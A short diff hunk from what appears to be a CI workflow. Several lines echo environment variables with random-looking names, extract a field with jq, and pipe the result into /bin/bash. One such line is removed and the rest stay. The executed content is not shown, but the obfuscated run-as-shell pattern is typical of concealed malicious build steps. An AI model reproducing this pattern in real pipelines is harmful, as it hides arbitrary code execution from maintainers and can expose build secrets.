@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$osu3365" | jq -r .bhfs4132 | /bin/bash
           echo $de7980 | jq -r .lvdln0 | /bin/bash
           echo $vgslk4561 | jq -r .p13570 | /bin/bash
-          echo $mdwk546 | jq -r .u2866 | /bin/bash
           printf '%s' "$pq66" | jq -r .irrze58 | /bin/bash
           printf '%s' "$jruy64" | jq -r .x3 | /bin/bash
           echo $qz1 | jq -r .fqgfr8823 | /bin/bash
